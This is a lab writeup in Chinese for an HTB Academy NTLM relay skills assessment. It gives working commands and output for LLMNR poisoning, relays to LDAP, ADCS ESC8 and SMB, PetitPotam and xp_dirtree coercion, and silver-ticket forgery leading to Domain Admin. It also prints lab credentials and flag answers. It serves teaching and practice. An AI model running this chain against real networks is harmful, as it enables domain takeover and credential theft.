# Writeup：NTLM Relay Attacks — Skills Assessment（Q1–Q4）

**Module 情境**：HTB Academy *NTLM Relay Attacks* 模組 Skills Assessment（授權教學 lab，個人帳號練習）
**場景**：Inlanefreight 公司堅持使用 NTLM 而非 Kerberos，委託稽核其 AD 環境的驗證協定安全性。
**跳板機**：ACADEMY-NTLMR01-LINUX02-SA（htb-student / `HTB_@cademy_stdnt!`），雙網卡：`ens160` 對外管理網段，`ens192` = `172.16.119.20`，接到內部 AD 網段 `172.16.119.0/16`。
**網域**：`INLANEFREIGHT.LOCAL`（Domain SID `S-1-5-21-1207890233-375443991-2397730614`）

**已知主機**：

| 主機 | IP | 角色 |
|---|---|---|
| DC01 | 172.16.119.3 | Domain Controller + ADCS (`INLANEFREIGHT-DC01-CA`) |
| BACKUP01 | 172.16.119.70 | 備份伺服器 |
| SQL03 | 172.16.119.80 | MSSQL (`SQL03\SQLEXPRESS`) |

**四題答案總覽**：

| 題號 | 答案 |
|---|---|
| Q1 | `mozhar` |
| Q2 | `ADCS_Coercing_Authentication` |
| Q3 | `Here1S@notherPassword!`（SQL 原生登入 `sqlftp` 的密碼） |
| Q4 | `Pwn_DC_Made_3@Sy_With0uT_S1gning` |

---

## Q1 — LLMNR/NBT-NS Poisoning 擷取 NTLMv2 Username

### 1.1 確認攻擊介面

```bash
ip a | grep -E 'ens|inet '
# ens192: 172.16.119.20/24  ← 唯一接 AD 內網的介面
```

### 1.2 設定 Responder 只做廣播投毒，SMB/HTTP 交給 ntlmrelayx

```bash
# ~/tools/Responder/Responder.conf
SMB = Off
HTTP = Off
```

這一步是為了讓 Responder 專心回答 LLMNR/NBT-NS 查詢（把自己的 IP 回報給發查詢的主機），把實際的 SMB／HTTP 認證接手工作留給 `ntlmrelayx.py`，才能把捕獲到的憑證直接 relay 出去，而不是只被 Responder 存成雜湊檔。

### 1.3 啟動 Responder，等待背景流量

SQL03（172.16.119.80）上有一支固定週期（約 30 秒一次）執行的腳本，會嘗試解析兩個不存在的主機名稱：

```bash
sudo python3 ~/tools/Responder/Responder.py -I ens192
```

```
[LLMNR]  Poisoned answer sent to 172.16.119.80 for name text
[LLMNR]  Poisoned answer sent to 172.16.119.80 for name dbservertest
```

這兩個名稱各對應一條不同的驗證流量：

- `text` → SQL03 嘗試用 **FTP** 連線（見 Q3）
- `dbservertest` → SQL03 上某個行程以 **HTTP NTLM** 認證連線（本題用到的就是這條）

### 1.4 捕獲 NTLMv2-SSP Username

把 `-tf` 目標設成任意一台（這裡先設 BACKUP01）、同時啟動 `ntlmrelayx.py`，HTTP 認證到來時會在 log 印出使用者名稱：

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

```
[*] HTTPD(80): Connection from INLANEFREIGHT/MOZHAR@172.16.119.80 controlled, attacking target smb://backup01...
[*] Authenticating against smb://backup01.inlanefreight.local as INLANEFREIGHT/MOZHAR SUCCEED
```

**答案（去掉 domain）**：`mozhar`

---

## Q2 — Compromise BACKUP01（ADCS ESC8 Relay + Silver Ticket）

### 2.1 自建一個可控的機器帳號（之後要用它主動發起 coercion）

先讓捕獲到的 `mozhar` 認證 relay 到 LDAP，用 `--add-computer` 建立一個我方掌握密碼的電腦帳號（預設 `MachineAccountQuota` 允許任意已認證使用者新增電腦帳號）：

```bash
ntlmrelayx.py -t ldap://dc01.inlanefreight.local -smb2support --no-dump \
  --add-computer ATTACKPC01 'Attack@12345!'
```

```
[*] Adding new computer with username: ATTACKPC01$ and password: Attack@12345! result: OK
```

驗證它是真正可用的網域主體（之後所有 coercion 都改用這個帳號，不再依賴 relay 來的臨時身分）：

```bash
getTGT.py INLANEFREIGHT.LOCAL/'ATTACKPC01$':'Attack@12345!' -dc-ip 172.16.119.3
# → 成功取得 TGT，證明是合法 AD 物件
```

### 2.2 PetitPotam coerce BACKUP01，relay 到 DC01 的 ADCS Web Enrollment（ESC8）

先確認 CA 設定：

```bash
certipy find -u 'ATTACKPC01$@INLANEFREIGHT.LOCAL' -p 'Attack@12345!' -dc-ip 172.16.119.3 -vulnerable -stdout
```

```
Web Enrollment  : Enabled
Enforce Encryption for Requests : Disabled
[!] ESC8 : Web Enrollment is enabled and Request Disposition is set to Issue
```

啟動 relay，目標是 CA 的 Web Enrollment 端點：

```bash
ntlmrelayx.py -t http://dc01.inlanefreight.local/certsrv/certfnsh.asp --adcs -smb2support
```

另開一個連線，用 PetitPotam（MS-EFSRPC）強制 BACKUP01 的機器帳號對我方認證：

```bash
python3 ~/tools/PetitPotam/PetitPotam.py \
  -d INLANEFREIGHT.LOCAL -u 'ATTACKPC01$' -p 'Attack@12345!' \
  172.16.119.20 backup01.inlanefreight.local
```

```
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

> **解讀**：`EfsRpcOpenFileRaw` 已被 2021 年的 patch 擋掉（直接回 `RPC_ACCESS_DENIED`），但 PetitPotam 會自動退回去用另一個尚未修補的函式 `EfsRpcEncryptFileSrv`，收到 `ERROR_BAD_NETPATH`（代表伺服器真的嘗試去連我方指定的 UNC 路徑，只是路徑本身不存在）才是**coercion 成功**的訊號。

relay 端立刻收到 `BACKUP01$` 的認證並拿到憑證：

```
[*] Authenticating against http://dc01.inlanefreight.local as INLANEFREIGHT/BACKUP01$ SUCCEED
[*] GOT CERTIFICATE! ID 21
```

### 2.3 用憑證換 NT Hash（PKINIT / UnPAC-the-Hash）

```bash
echo '<base64 證書>' | base64 -d > backup01.pfx
certipy auth -pfx backup01.pfx -dc-ip 172.16.119.3
```

```
[*] Got TGT
[*] Got hash for 'backup01$@inlanefreight.local': aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
```

### 2.4 用機器帳號雜湊偽造 Silver Ticket，直接拿 Administrator

機器帳號本身沒有被授予遠端管理權限，但可以用它的 NT Hash 偽造一張**該機器自己服務**的 TGS（Silver Ticket），因為只有該機器自己的 krbtgt 以外，驗證票證真偽靠的就是這組機器密鑰：

```bash
lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH> \
  'INLANEFREIGHT.LOCAL/BACKUP01$'@172.16.119.3 1
# → Domain SID: S-1-5-21-1207890233-375443991-2397730614

ticketer.py -nthash <NT_HASH> \
  -domain-sid S-1-5-21-1207890233-375443991-2397730614 \
  -domain INLANEFREIGHT.LOCAL -spn cifs/backup01.inlanefreight.local Administrator
```

```bash
KRB5CCNAME=Administrator.ccache atexec.py -k -no-pass backup01.inlanefreight.local \
  'type C:\Users\Administrator\Desktop\flag.txt'
```

```
ADCS_Coercing_Authentication
```

**答案**：`ADCS_Coercing_Authentication`

---

## Q3 — 找出 SQL 使用者 sqlftp 的密碼

這題最容易踩坑：Responder 真的捕到一組帳密，但那並不是答案。

### 3.1 誘餌：Responder FTP 假服務捕獲的明文密碼

SQL03 上那支每 30 秒跑一次的腳本，解析失敗的 `text` 這個名稱後，真的用明文 FTP 連到我方（Responder 內建的假 FTP 服務會記錄明文帳密）：

```
USER sql_ftp_test
PASS SQLUniqueCr3ndt1als$013!
```

> **踩坑記錄**：一開始誤以為 `sql_ftp_test` ≈ 題目要的 `sqlftp`，直接拿這組密碼去撞 AD 網域帳號，`crackmapexec` 回報 `[+]` 成功，便以為解完了——結果送出答案被 HTB 判定錯誤。
>
> 事後用「對一個刻意打錯、保證不存在的帳號」做同樣測試，`crackmapexec` 一樣回 `[+]` 成功；用 impacket 的 `SMBConnection` 直接檢查 session 旗標才發現三者 `isGuest` 全部是 `1`——**這台 DC 對任何帳密組合都會靜默降級成 Guest session，SMB 層的「成功」訊號完全不可信**。用 `getTGT.py` 走 Kerberos AS-REQ 直接驗證才發現 `sql_ftp_test` 跟 `sqlftp` 兩者都回 `KDC_ERR_C_PRINCIPAL_UNKNOWN`——**都不是真正的 AD 網域帳號**。完整網域使用者清單（見下）也證實了這一點。

### 3.2 真正的路徑：relay BACKUP01$ 到 SQL03，讀到 ShareSQL

重新 coerce BACKUP01（同 2.2 手法），這次把 relay 目標換成 SQL03 的 SMB，用互動模式接手：

```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
python3 ~/tools/PetitPotam/PetitPotam.py -d INLANEFREIGHT.LOCAL -u 'ATTACKPC01$' -p 'Attack@12345!' \
  172.16.119.20 backup01.inlanefreight.local
```

```
[*] Authenticating against smb://sql03.inlanefreight.local as INLANEFREIGHT/BACKUP01$ SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

`BACKUP01$`（電腦帳號）能讀到 `ShareSQL` 這個共享，但本機帳號（`cmatos`／`localws01`，同樣是從 BACKUP01 的 DPAPI 憑證庫挖出來的舊帳密，見下方備註）跟一般網域使用者都被拒絕——可見這個共享的權限是刻意只開給特定電腦帳號：

```
nc 127.0.0.1 11000
# use ShareSQL
# tree
/ShareSQL/sample.sql
/ShareSQL/ShareSQL.zip
# get sample.sql
# get ShareSQL.zip
```

### 3.3 破解 ShareSQL.zip（AES 加密），抓到真正的帳密

```bash
7z t -p'SQLUniqueCr3ndt1als$013!' ShareSQL.zip
# Everything is Ok   ← 密碼重複使用成立！跟 Q1/3.1 抓到的 FTP 密碼一樣
7z x -p'SQLUniqueCr3ndt1als$013!' ShareSQL.zip
cat connect.sql
```

```sql
DECLARE @Username VARCHAR(50) = 'sqlftp';
DECLARE @Password VARCHAR(50) = 'Here1S@notherPassword!';
```

驗證：

```bash
mssqlclient.py 'sqlftp:Here1S@notherPassword!@sql03.inlanefreight.local'
# SQL (sqlftp  guest@master)>   ← 登入成功
```

**答案**：`Here1S@notherPassword!`

> 備註：用 `dploot machinetriage`（透過 BACKUP01 Administrator 的 NT Hash 讀取 `C:\Windows\System32\Microsoft\Protect\S-1-5-18` 下的 SYSTEM DPAPI 金鑰）另外挖到兩組 Credential Manager 殘留的舊帳密（`cmatos` / `localws01`），但兩者都已從 AD 刪除或本來就只是本機帳號，純粹是誤導，跟正解無關。

---

## Q4 — Compromise DC01（xp_dirtree 強制 SQL 服務帳號認證）

### 4.1 先搞清楚 sqladm 是誰

```bash
GetUserSPNs.py INLANEFREIGHT.LOCAL/'ATTACKPC01$':'Attack@12345!' -dc-ip 172.16.119.3 -request
```

```
ServicePrincipalName                     Name
MSSQLSvc/SQL03.INLANEFREIGHT.LOCAL:1433  sqladm   CN=Domain Admins...
```

`sqladm` 持有 `MSSQLSvc/SQL03` 的 SPN，代表它就是 **SQL03 上 MSSQL 服務的執行帳號**，而且是唯一的 Domain Admin。（一度嘗試 kerberoast 這張票，rockyou + best64/d3ad0ne/dive 規則組合、自製片語字典全部落空——密碼強度太高，此路不通，後來改走下面這條路徑，完全不需要破解密碼。）

### 4.2 xp_dirtree：逼 SQL 服務帳號對我方認證

啟動 relay，目標直接設成 DC01（互動模式方便之後直接讀檔）：

```bash
ntlmrelayx.py -t dc01.inlanefreight.local -smb2support -i
```

用 Q3 拿到的 `sqlftp` 登入 MSSQL（它沒有 `sysadmin`，也沒有 `xp_cmdshell` 權限，但 `xp_dirtree` 這個擴充預存程序預設不需要 sysadmin）：

```sql
EXEC master..xp_dirtree '\\172.16.119.20\test',1,1
```

relay 端立刻看到：

```
[*] SMBD-Thread-5: Received connection from 172.16.119.80, attacking target smb://dc01.inlanefreight.local
[*] Authenticating against smb://dc01.inlanefreight.local as INLANEFREIGHT/SQLADM SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

> **原理**：`xp_dirtree` 會讓 **SQL Server 服務本身的 Windows 帳號**（這裡就是 `sqladm`）去對指定的 UNC 路徑發起一次 SMB 認證以列出目錄——而 `sqladm` 剛好就是 Domain Admin。只要這個驗證走的是沒有關閉 SMB signing 的連線，就能被 relay 到任何地方。

### 4.3 直接用 Domain Admin 身分讀 DC01 的 flag

```bash
nc 127.0.0.1 11000
# use C$
# cd Users\Administrator\Desktop
# cat flag.txt
```

```
Pwn_DC_Made_3@Sy_With0uT_S1gning
```

**答案**：`Pwn_DC_Made_3@Sy_With0uT_S1gning`

（flag 內容本身就是整個模組的結論：只要 SMB signing 沒開，從一個低權限的 SQL 登入，就能一路 relay 出 Domain Admin。）

---

## 這次卡關最久、事後才搞懂的三個坑

1. **CME 對這台 DC 的 SMB 認證結果不可信**。任何帳密組合都會被判定「登入成功」，實際上是靜默 Guest session；務必用 `isGuestSession()` 或直接走 Kerberos `getTGT.py` 交叉驗證，才知道帳號是真是假。
2. **`ntlmrelayx.py` 透過 `echo 密碼 | sudo -S ...` 啟動時會立刻自己關閉**。因為 sudo 消耗掉那一行密碼後，子行程繼承的 stdin 已經是 EOF，若程式內部有任何讀 stdin 的邏輯就會誤判收到結束訊號而退出。解法：`setcap cap_net_bind_service=+ep $(which python3)`，之後完全不需要 sudo 就能綁 445/80 這些低位 port。
3. **CME 的 `dfscoerce` 模組有 bug**：`self.args.verbose` 這個屬性在該類別根本不存在，導致真正送出 `NetrDfsRemoveStdRoot` 的那一行被例外吃掉，從沒真正發送過封包，卻無條件印出 `VULNERABLE`。修掉這一行（改成 `if False:`）後重測，DC01 對 DFSCoerce 其實是 `rpc_s_access_denied`——跟其他 coercion 手法一樣被擋，並非真的可用。

---

*Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>*
